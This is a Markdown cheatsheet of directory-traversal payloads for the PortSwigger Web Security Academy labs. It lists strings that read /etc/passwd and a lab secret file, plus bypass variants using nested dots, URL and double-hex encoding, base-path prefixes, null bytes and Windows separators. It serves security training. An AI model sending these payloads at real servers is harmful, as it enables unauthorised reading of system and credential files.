# 📁 Directory (Path) Traversal Cheatsheet

Complete exploitation methodologies, bypass techniques, and target payloads for Directory Traversal labs in PortSwigger Web Security Academy.

---

## 📌 1. Basic Path Traversal Payloads

### Relative Path Traversal
Traverse directory structures upward to read target system files.

* **Linux System Files (`/etc/passwd`):**
<pre><code>../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd</code></pre>

* **PortSwigger Target File (`/home/carlos/secret`):**
<pre><code>../../../home/carlos/secret
../../../../home/carlos/secret
../../../../../home/carlos/secret</code></pre>

### Absolute Path Direct Retrieval
Used when applications process input directly without prepending base directories (e.g., `/var/www/images/`).

<pre><code>/etc/passwd
/home/carlos/secret</code></pre>

---

## 📌 2. Bypass Techniques & Input Filters

### Non-Recursive Filter Stripping
Bypasses basic string replacement filters (e.g., `filename.replace("../", "")`) that strip `../` non-recursively. When `../` inside `....//` is stripped, the remaining characters form `../`.

<pre><code>....//....//....//etc/passwd
....//....//....//home/carlos/secret</code></pre>

### Single URL Encoding
Bypasses input validation filters that only block plain `../` sequences by URL encoding characters (`.` = `%2e`, `/` = `%2f`).

<pre><code>..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2fhome%2fcarlos%2fsecret</code></pre>

### Double URL Encoding
Bypasses WAFs and front-end proxies that decode URL components before passing requests to backend application servers that decode input a second time.

<pre><code>..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252fhome%252fcarlos%252fsecret</code></pre>

### Full Hex Encoding (WAF Bypass)
Encodes every character (including letters, dots, and slashes) into double hex sequences to bypass strict Web Application Firewall (WAF) regex patterns.

<pre><code>%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%38%25%36%66%25%36%64%25%36%35%25%32%66%25%36%33%25%36%31%25%37%32%25%36%63%25%36%66%25%37%33%25%32%66%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34</code></pre>

### Validation of Starting Path
Bypasses applications that require the parameter to start with an expected base directory (e.g., `/var/www/images/`).

<pre><code>/var/www/images/../../../etc/passwd
/var/www/images/../../../home/carlos/secret</code></pre>

### Validation of File Extension via Null Byte (`%00`)
Bypasses checks that verify file extensions (e.g., `.png`, `.jpg`). The null byte truncates file paths in legacy file API calls in Node.js/PHP/Java.

<pre><code>../../../etc/passwd%00.png
../../../home/carlos/secret%00.png</code></pre>

### Windows OS Path Separator
Leverages Windows directory separators (`\`) when operating against Windows-based web servers.

<pre><code>..\..\..\windows\system32\drivers\etc\hosts
..\..\..\home\carlos\secret</code></pre>

---

## 🗄️ Quick Reference Table

| Environment / Filter Context | Exploit Technique | Payload Pattern | Key Objective |
| :--- | :--- | :--- | :--- |
| **Standard Linux** | Relative Traversal | `../../../etc/passwd` | Arbitrary File Read |
| **No Base Path Lock** | Absolute Traversal | `/etc/passwd` | Direct File Fetch |
| **Non-Recursive Filter** | Nested Stripping | `....//....//etc/passwd` | Stripping Bypass |
| **Single Decoder** | URL Encoding | `..%2f..%2fetc%2fpasswd` | Filter Evasion |
| **Double Decoder / WAF** | Double URL Encoding | `..%252f..%252fetc%252fpasswd` | WAF Bypass |
| **Prefix Requirement** | Base Directory Injection | `/var/www/images/../../../etc/passwd` | Logic Constraint Bypass |
| **Extension Check** | Null Byte Truncation | `../../../etc/passwd%00.png` | Extension Bypass |
| **Windows OS** | Backslash Separator | `..\..\..\windows\system32\...` | Windows Path Resolution |
